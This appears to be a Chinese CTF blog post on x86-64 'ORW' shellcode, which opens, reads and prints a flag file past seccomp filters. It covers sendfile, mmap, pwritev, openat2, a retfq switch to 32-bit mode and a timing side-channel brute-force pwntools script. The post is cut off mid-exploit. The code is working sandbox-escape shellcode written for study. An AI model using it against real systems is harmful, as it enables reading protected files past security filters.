<!doctype html><html lang=zh-CN data-theme=light><head><meta charset=UTF-8><meta name=viewport content="width=device-width"><meta name=theme-color content="#222" media="(prefers-color-scheme: light)"><meta name=generator content="Hugo 0.126.1"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_16x16_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_32_32_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="orw-plus"><meta itemprop=description content="集中一点,登峰造极"><meta name=description content="集中一点,登峰造极"><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="https://zp9080.github.io/imgs/author.png"><meta itemprop=keywords content="orw-plus"><meta property="og:type" content="article"><meta property="og:title" content="orw-plus"><meta property="og:description" content="集中一点,登峰造极"><meta property="og:image" content="/imgs/author.png"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="https://zp9080.github.io/post/shellcode/orw-plus/"><meta property="og:site_name" content="f1ow-blog"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="f1ow"><meta property="article:published_time" content="2024-07-28 00:00:00 +0000 UTC"><meta property="article:modified_time" content="2024-07-28 00:00:00 +0000 UTC"><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/font-awesome/6.6.0/css/all.min.css><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/animate.css/4.1.1/animate.min.css><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href=/css/main.min.bfbac3431de920c11b5b1cafa45029ea1bc93d5d3da50fed4ab6924b4c250360.css><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script class=next-config data-name=page type=application/json>{"comments":false,"isHome":false,"isPage":true,"path":"orw-plus","permalink":"https://zp9080.github.io/post/shellcode/orw-plus/","title":"orw-plus","waline":{"js":[{"alias":"@waline/client","alias_name":"waline","file":"dist/pageview.js","name":"pageview","version":"2.15.8"},{"alias":"@waline/client","alias_name":"waline","file":"dist/comment.js","name":"comment","version":"2.15.8"}]}}</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>orw-plus - f1ow-blog</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><div class=overlay></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>f1ow-blog</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description>集中一点,登峰造极</p></div><div class=site-nav-right><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/about/ class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-archives"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
<span class=badge>207</span></a></li><li class="menu-item menu-item-categories"><a href=/categories/ class=hvr-icon-pulse rel=section><i class="fa fa-categories hvr-icon"></i>分类</a></li><li class="menu-item menu-item-tags"><a href=/tags/ class=hvr-icon-pulse rel=section><i class="fa fa-tags hvr-icon"></i>标签</a></li><li class="menu-item menu-item-search"><a role=button class="popup-trigger hvr-icon-pulse"><i class="fa fa-search fa-fw hvr-icon"></i>搜索</a></li></ul></nav><div class=search-pop-overlay><div class="popup search-popup"><div class=search-header><span class=search-icon><i class="fa fa-search"></i></span><div class=search-input-container><input autocomplete=off autocapitalize=off maxlength=80 placeholder=搜索... spellcheck=false type=search class=search-input></div><span class=popup-btn-close role=button><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class=search-result-icon><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents><ul><li><a href=#两种基本orw的shellcode>两种基本orw的shellcode</a></li><li><a href=#orw缺r>ORW缺R</a></li><li><a href=#orw缺w>ORW缺W</a></li><li><a href=#orw缺o>ORW缺O</a></li></ul></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=f1ow src=/imgs/img-lazy-loading.gif data-src=/imgs/author.png><p class=site-author-name itemprop=name>f1ow</p><div class=site-description itemprop=description>集中一点,登峰造极</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>207</span>
<span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>38</span>
<span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>80</span>
<span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/zp9080 title="Github → https://github.com/zp9080" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
Github</a></span></div><div class="cc-license animated" itemprop=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh class=cc-opacity rel=noopener target=_blank title=共享知识><img src=/imgs/img-lazy-loading.gif data-src=/imgs/cc/big/by_nc_sa.svg alt=共享知识></a></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://v3rdant.cn/ title=https://v3rdant.cn/ target=_blank>v3rdant</a></li><li class=links-of-blogroll-item><a href=https://juicymio.github.io/ title=https://juicymio.github.io/ target=_blank>juicymio</a></li><li class=links-of-blogroll-item><a href=https://ka7arotto.github.io/ title=https://ka7arotto.github.io/ target=_blank>Goku</a></li></ul></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate=2024-07-28T00:00:00+00:00></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=273686></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=660></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate=2025-02-27T17:57:37+08:00></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
<span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a><a href=https://github.com/zp9080 rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg>
</a><script type=text/javascript src=//sidecar.gitter.im/dist/sidecar.v1.js async></script><script type=text/javascript>((window.gitter={}).chat={}).options={room:"hugo-next/community"}</script><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://zp9080.github.io/post/shellcode/orw-plus/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/author.png"><meta itemprop=name content="f1ow"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="f1ow"><meta itemprop=description content="集中一点,登峰造极"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="orw-plus"><meta itemprop=description content='详细内容可以参考这篇文章 贴一个总结的还不错的文章 [TOC] 两种基本orw的shellcode 第一种 ; open("flag", 0) push 0x67616c66 push 0x2 pop rax mov rdi,rsp xor rsi,rsi syscall ; read(fd, rsp, 0x50) mov rdi,rax xor rax,rax mov rsi,rsp push'></span><header class=post-header><h1 class=post-title itemprop="name headline">orw-plus
<a href=https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/post/Shellcode/orw-plus.md rel="noopener external nofollow noreferrer" target=_blank class="exturl post-edit-link" title=编辑><i class="fa fa-pen-nib"></i></a></h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2024-07-28 00:00:00 +0000 UTC" itemprop="dateCreated datePublished" datetime="2024-07-28 00:00:00 +0000 UTC">2024-07-28
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
</span><span class=post-meta-item-text title=分类于>分类于：
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/shellcode itemprop=url rel=index><span itemprop=name>PWN/Shellcode</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=字数><span class=post-meta-item-icon><i class="fas fa-solid fa-file-word"></i>
</span><span class=post-meta-item-text>字数：</span>
<span>3177</span>
</span><span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="fas fa-solid fa-clock"></i>
</span><span class=post-meta-item-text>阅读：&ap;</span>
<span>7分钟</span>
</span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=busuanzi_value_page_pv data-path=/post/shellcode/orw-plus/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class="post-body autonumber" itemprop=articleBody><p><a href=https://www.jianshu.com/p/754b0a2ae353 title=详细内容可以参考这篇文章 rel="noopener external nofollow noreferrer" target=_blank class=exturl>详细内容可以参考这篇文章
<i class="fa fa-external-link-alt"></i>
</a><a href=https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/ title=贴一个总结的还不错的文章 rel="noopener external nofollow noreferrer" target=_blank class=exturl>贴一个总结的还不错的文章
<i class="fa fa-external-link-alt"></i>
</a>[TOC]</p><h1 id=两种基本orw的shellcode>两种基本orw的shellcode
<a class=header-anchor href=#%e4%b8%a4%e7%a7%8d%e5%9f%ba%e6%9c%acorw%e7%9a%84shellcode></a></h1><p>第一种</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span> ; open(&#34;flag&#34;, 0)
</span></span><span style=display:flex><span>    push   0x67616c66
</span></span><span style=display:flex><span>    push   0x2
</span></span><span style=display:flex><span>    pop    rax
</span></span><span style=display:flex><span>    mov    rdi,rsp
</span></span><span style=display:flex><span>    xor    rsi,rsi
</span></span><span style=display:flex><span>    syscall 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   ; read(fd, rsp, 0x50)
</span></span><span style=display:flex><span>    mov    rdi,rax
</span></span><span style=display:flex><span>    xor    rax,rax
</span></span><span style=display:flex><span>    mov    rsi,rsp
</span></span><span style=display:flex><span>    push   0x50
</span></span><span style=display:flex><span>    pop    rdx
</span></span><span style=display:flex><span>    syscall 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   ; write(1, rsp, 0x50)
</span></span><span style=display:flex><span>    push   0x1
</span></span><span style=display:flex><span>    pop    rax
</span></span><span style=display:flex><span>    push   0x1
</span></span><span style=display:flex><span>    pop    rdi
</span></span><span style=display:flex><span>    mov    rsi,rsp
</span></span><span style=display:flex><span>    push   0x50
</span></span><span style=display:flex><span>    pop    rdx
</span></span><span style=display:flex><span>    syscall
</span></span></code></pre></div><p>第二种(第二种主要是用了sendfile系统调用)
<a href=https://blog.csdn.net/fengxinlinux/article/details/73477855 title=sendfile看这篇文章 rel="noopener external nofollow noreferrer" target=_blank class=exturl>sendfile看这篇文章
<i class="fa fa-external-link-alt"></i></a></p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>    /* call open(&#39;rsp&#39;, 0, &#39;O_RDONLY&#39;) */
</span></span><span style=display:flex><span>    push 0x67616c66  /* push b&#39;flag\x00&#39; */
</span></span><span style=display:flex><span>    push 2
</span></span><span style=display:flex><span>    pop rax
</span></span><span style=display:flex><span>    mov rdi, rsp
</span></span><span style=display:flex><span>    xor esi, esi 
</span></span><span style=display:flex><span>    cdq 
</span></span><span style=display:flex><span>    syscall
</span></span><span style=display:flex><span>    /* call sendfile(1, &#39;rax&#39;, 0, 0x100) */
</span></span><span style=display:flex><span>    mov r10d, 0x100
</span></span><span style=display:flex><span>    mov rsi, rax
</span></span><span style=display:flex><span>    push 40 /* sendfile的系统调用号0x28 */
</span></span><span style=display:flex><span>    pop rax
</span></span><span style=display:flex><span>    push 1
</span></span><span style=display:flex><span>    pop rdi
</span></span><span style=display:flex><span>    cdq 
</span></span><span style=display:flex><span>    syscall
</span></span></code></pre></div><h1 id=orw缺r>ORW缺R
<a class=header-anchor href=#orw%e7%bc%bar></a></h1><p><strong>read（pread、readv、preadv、sendfile、mmap）</strong></p><ul><li>splice是和内核相关的了</li></ul><ol><li>可以考虑sendfile</li><li>pread64、readv、preadv、preadv2系统调用</li><li>考虑mmap函数：最常见的用途之一是将文件映射到内存中。这允许进程直接从内存中读取或写入文件，而无需调用标准的 I/O 函数（如 read 和 write）。通过这种方式，可以更高效地访问文件，特别是对于大文件和随机访问</li></ol><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#b44>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#b44>/* open(&#34;flag&#34;,0)*/
</span></span></span><span style=display:flex><span><span style=color:#b44>mov rax,0x67616c662f2e
</span></span></span><span style=display:flex><span><span style=color:#b44>push rax
</span></span></span><span style=display:flex><span><span style=color:#b44>mov rdi, rsp
</span></span></span><span style=display:flex><span><span style=color:#b44>xor edx, edx
</span></span></span><span style=display:flex><span><span style=color:#b44>xor esi, esi
</span></span></span><span style=display:flex><span><span style=color:#b44>mov rax,2 
</span></span></span><span style=display:flex><span><span style=color:#b44>syscall
</span></span></span><span style=display:flex><span><span style=color:#b44>
</span></span></span><span style=display:flex><span><span style=color:#b44>
</span></span></span><span style=display:flex><span><span style=color:#b44>void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
</span></span></span><span style=display:flex><span><span style=color:#b44>/*mmap(0x23330000,0x1000,1,1,rax,0)*/
</span></span></span><span style=display:flex><span><span style=color:#b44>mov rsi, 0x1000
</span></span></span><span style=display:flex><span><span style=color:#b44>mov r10,1
</span></span></span><span style=display:flex><span><span style=color:#b44>mov r9d, 0
</span></span></span><span style=display:flex><span><span style=color:#b44>mov r8d, eax
</span></span></span><span style=display:flex><span><span style=color:#b44>mov edx, 1   /*共享映射*/
</span></span></span><span style=display:flex><span><span style=color:#b44>mov edi, 0x2333000
</span></span></span><span style=display:flex><span><span style=color:#b44>mov rax, 9
</span></span></span><span style=display:flex><span><span style=color:#b44>syscall
</span></span></span><span style=display:flex><span><span style=color:#b44>                
</span></span></span><span style=display:flex><span><span style=color:#b44>/* 而且发现这个地方不能用pwrite,原因是因为只有write,sendfile这种才能对标准输出 */
</span></span></span><span style=display:flex><span><span style=color:#b44>/*write(1,0x2333000,0x100)*/
</span></span></span><span style=display:flex><span><span style=color:#b44>mov rdi, 1
</span></span></span><span style=display:flex><span><span style=color:#b44>mov rsi, 0x2333000
</span></span></span><span style=display:flex><span><span style=color:#b44>mov rdx, 0x100
</span></span></span><span style=display:flex><span><span style=color:#b44>mov rax, 1
</span></span></span><span style=display:flex><span><span style=color:#b44>syscall
</span></span></span><span style=display:flex><span><span style=color:#b44>&#39;&#39;&#39;</span>
</span></span></code></pre></div><h1 id=orw缺w>ORW缺W
<a class=header-anchor href=#orw%e7%bc%baw></a></h1><p><strong>write（pwrite64、writev）</strong></p><ol><li>pwrite64 0x12 pwrite64 的原型是：ssize_t pwrite64(int fd, const void *buf, size_t count, off64_t offset);</li><li>writev系统调用
<a href=https://www.cnblogs.com/BlueBlueSea/p/14999635.html title=可以参考此博客 rel="noopener external nofollow noreferrer" target=_blank class=exturl>可以参考此博客
<i class="fa fa-external-link-alt"></i></a></li><li>进行逐位爆破获取flag(也称作测信道爆破)</li><li>pwritev,pwritev2
<a href="https://xz.aliyun.com/t/13200?time__1311=mqmxnDBD90YDqGXYYK0%3Dtpu%3DDuAK8C4D&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F#toc-5" title=可以参考这篇文章 rel="noopener external nofollow noreferrer" target=_blank class=exturl>可以参考这篇文章
<i class="fa fa-external-link-alt"></i>
</a><a href=https://www.cnblogs.com/Sta8r9/p/17930831.html title=还有这篇博客 rel="noopener external nofollow noreferrer" target=_blank class=exturl>还有这篇博客
<i class="fa fa-external-link-alt"></i></a></li></ol><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwn</span> <span style=color:#a2f;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>import</span> <span style=color:#00f;font-weight:700>time</span>
</span></span><span style=display:flex><span>context(arch <span style=color:#666>=</span> <span style=color:#b44>&#34;amd64&#34;</span>, os <span style=color:#666>=</span> <span style=color:#b44>&#34;linux&#34;</span>)<span style=color:#080;font-style:italic>#, log_level = &#34;debug&#34;)</span>
</span></span><span style=display:flex><span>li <span style=color:#666>=</span> <span style=color:#a2f;font-weight:700>lambda</span> x : <span style=color:#a2f>print</span>(<span style=color:#b44>&#39;</span><span style=color:#b62;font-weight:700>\x1b</span><span style=color:#b44>[01;38;5;214m&#39;</span> <span style=color:#666>+</span> x <span style=color:#666>+</span> <span style=color:#b44>&#39;</span><span style=color:#b62;font-weight:700>\x1b</span><span style=color:#b44>[0m&#39;</span>) <span style=color:#080;font-style:italic>#彩色打印</span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>pwn</span>():
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>global</span> io
</span></span><span style=display:flex><span>    flag_addr <span style=color:#666>=</span> <span style=color:#666>0x405000</span>
</span></span><span style=display:flex><span>    string <span style=color:#666>=</span> <span style=color:#b44>&#34;</span><span style=color:#b68;font-weight:700>{}</span><span style=color:#b44>0123456789-_abcdefghijklmnopqrstuvwxyz&#34;</span><span style=color:#080;font-style:italic>#有需要的话加上大写字母</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a2f>list</span> <span style=color:#666>=</span> [<span style=color:#a2f>ord</span>(x) <span style=color:#a2f;font-weight:700>for</span> x <span style=color:#a2f;font-weight:700>in</span> string]
</span></span><span style=display:flex><span>    flag <span style=color:#666>=</span> <span style=color:#b44>&#34;&#34;</span>
</span></span><span style=display:flex><span>    index <span style=color:#666>=</span> <span style=color:#666>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>while</span> <span style=color:#666>1</span>:
</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>for</span> i <span style=color:#a2f;font-weight:700>in</span> <span style=color:#a2f>range</span>(<span style=color:#666>39</span>):
</span></span><span style=display:flex><span>            io <span style=color:#666>=</span> process(binary)
</span></span><span style=display:flex><span>            <span style=color:#080;font-style:italic>#io = remote(&#34;&#34;,)</span>
</span></span><span style=display:flex><span>            loop_payload <span style=color:#666>=</span> <span style=color:#b44>&#39;&#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#b44>            mov rsp, </span><span style=color:#b68;font-weight:700>{}</span><span style=color:#b44>
</span></span></span><span style=display:flex><span><span style=color:#b44>            mov rdx,0
</span></span></span><span style=display:flex><span><span style=color:#b44>            mov dl,byte ptr [rsp+</span><span style=color:#b68;font-weight:700>{}</span><span style=color:#b44>]
</span></span></span><span style=display:flex><span><span style=color:#b44>            mov rcx,0
</span></span></span><span style=display:flex><span><span style=color:#b44>            mov cl,</span><span style=color:#b68;font-weight:700>{}</span><span style=color:#b44>
</span></span></span><span style=display:flex><span><span style=color:#b44>            cmp dl,cl
</span></span></span><span style=display:flex><span><span style=color:#b44>            jnz loop
</span></span></span><span style=display:flex><span><span style=color:#b44>            mov rax, 0x3c
</span></span></span><span style=display:flex><span><span style=color:#b44>            syscall
</span></span></span><span style=display:flex><span><span style=color:#b44>            loop:
</span></span></span><span style=display:flex><span><span style=color:#b44>            jmp loop
</span></span></span><span style=display:flex><span><span style=color:#b44>            &#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>	        <span style=color:#080;font-style:italic># rsp-&gt; flag_addr</span>
</span></span><span style=display:flex><span>            <span style=color:#080;font-style:italic>#diff -&gt; loop -&gt; timeout</span>
</span></span><span style=display:flex><span>            <span style=color:#080;font-style:italic>#same -&gt; next_step -&gt; exit(EOF) </span>
</span></span><span style=display:flex><span>            <span style=color:#080;font-style:italic>#如果是相同字符，那么就会调用exit导致EOFERROR，但是如果是不同的就会一直jmp loop不会有EOFERROR</span>
</span></span><span style=display:flex><span>            loop_payload <span style=color:#666>=</span> asm(loop_payload<span style=color:#666>.</span>format(flag_addr,index,<span style=color:#a2f>list</span>[i]))
</span></span><span style=display:flex><span>             <span style=color:#a2f;font-weight:700>try</span>:
</span></span><span style=display:flex><span>                io<span style=color:#666>.</span>clean()
</span></span><span style=display:flex><span>                io<span style=color:#666>.</span>recv(timeout<span style=color:#666>=</span><span style=color:#666>0.1</span>)
</span></span><span style=display:flex><span>            <span style=color:#a2f;font-weight:700>except</span> <span style=color:#d2413a;font-weight:700>EOFError</span> <span style=color:#a2f;font-weight:700>as</span> e:
</span></span><span style=display:flex><span>                flag <span style=color:#666>+=</span> <span style=color:#a2f>chr</span>(<span style=color:#a2f>list</span>[i])
</span></span><span style=display:flex><span>                index <span style=color:#666>=</span> index <span style=color:#666>+</span> <span style=color:#666>1</span>
</span></span><span style=display:flex><span>                io<span style=color:#666>.</span>close()
</span></span><span style=display:flex><span>                <span style=color:#a2f;font-weight:700>break</span>
</span></span><span style=display:flex><span>            <span style=color:#a2f;font-weight:700>finally</span>:
</span></span><span style=display:flex><span>                li(<span style=color:#b44>&#34;index:&#34;</span><span style=color:#666>+</span><span style=color:#a2f>str</span>(index))
</span></span><span style=display:flex><span>                li(<span style=color:#b44>&#34;strings: &#34;</span><span style=color:#666>+</span><span style=color:#a2f>chr</span>(<span style=color:#a2f>list</span>[i]))
</span></span><span style=display:flex><span>                li(<span style=color:#b44>&#34;flag:  &#34;</span><span style=color:#666>+</span><span style=color:#a2f>str</span>(flag))                        
</span></span><span style=display:flex><span>                io<span style=color:#666>.</span>close()
</span></span></code></pre></div><h1 id=orw缺o>ORW缺O
<a class=header-anchor href=#orw%e7%bc%bao></a></h1><p><strong>open（fopen、creat、openat、openat2、fopen64、open64、freopen）</strong></p><ol><li>尝试使用openat()函数，它的系统调用号是257，可以syscall调用也可以直接libc调用。int openat(int dirfd, const char *pathname, int flags, &mldr;);只需要写openat(0, &lsquo;/flag\x00&rsquo;)的形式即可</li><li>禁用了open后open64也用不了，因为open64最后会走到open</li><li>禁用了openat但是可以用openat2</li><li>retfq
<a href="https://xz.aliyun.com/t/6645?time__1311=n4%2BxnD0DRDBGitN47KDsA3xCq47ueAKItK4Irx&amp;alichlgref=https%3A%2F%2Fwww.jianshu.com%2F#toc-4" title=一篇讲的比较清楚的文章 rel="noopener external nofollow noreferrer" target=_blank class=exturl>一篇讲的比较清楚的文章
<i class="fa fa-external-link-alt"></i>
</a>主要思想就是通过调用32位的open来绕过，因为程序只是对64位的代码做限制，而通过写32位的shellcode能到达到open的目的，以32位的模式运行。通过retfq切换模式</li></ol><ul><li><p>核心指令retfq
先ret,再让cs=[rsp+0x8]</p></li><li><p>细节阐述：
1.程序是怎么知道要以64位模式运行还是以32位模式运行的；寄存器中有一个cs寄存器，cs = 0x23代表32位模式，cs = 0x33代表64位模式，而cs寄存器就是通过上面提到的retfq汇编指令来修改
2.retfq有两步操作，ret以及set cs，所以执行retfq会跳转到rsp同时将cs设置为[rsp+0x8]，我们只需要事先在ret位置写入32位的shellcode就可以执行了，但是这里有一点需要注意的是，retfq跳转过去的时候程序已经切换成了32位模式，所以地址解析也是以32位的规则来的，所以原先的rsp = 0x7ffe530d01b8会被解析成esp = 0x530d01b8<font color=red>所以在跳转过去后要先平衡好esp的地址，不能直接执行push </font>3.shellcode是写到栈上面的，如果把32位的shellcode在栈上的话，因为64位的栈地址长度比32位的长，所以32位模式下是无法解析出64位的栈地址的，retfq时就会crash掉，所以这里需要先调用mmap申请出一段适合32位的地址来存32位shellcode，mmap(0x40404040,0x7e,7,34,0,0)
4.直接调用32位下的read,write把flag打印出来，但是发现是bad system call，无法调用，所以还得回到64位模式下调用，再调用一次retfq，在64位条件下进行read和write，<font color=red>需要先把open的返回值保存到别的寄存器，因为在retfq回64位模式的时候会影响到rax</font></p></li><li><p>基本步骤：
1、用可见字符编写shellcode 调用mmap申请地址，调用read读入32位shellcode
2、同时构造用retfq切换到32位模式，跳转到32位shellcode 位置
3、按照32位规则调用fp = open(&ldquo;flag&rdquo;)
4、保存open函数返回的fp指针，再次调用retfq切换回64模式，跳转到64位shellcode位置
5、执行read,write打印flag</p></li><li><p>exp:</p></li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwn</span> <span style=color:#a2f;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context(log_level<span style=color:#666>=</span><span style=color:#b44>&#39;debug&#39;</span>)
</span></span><span style=display:flex><span>p <span style=color:#666>=</span> process(<span style=color:#b44>&#39;./shellcode&#39;</span>)
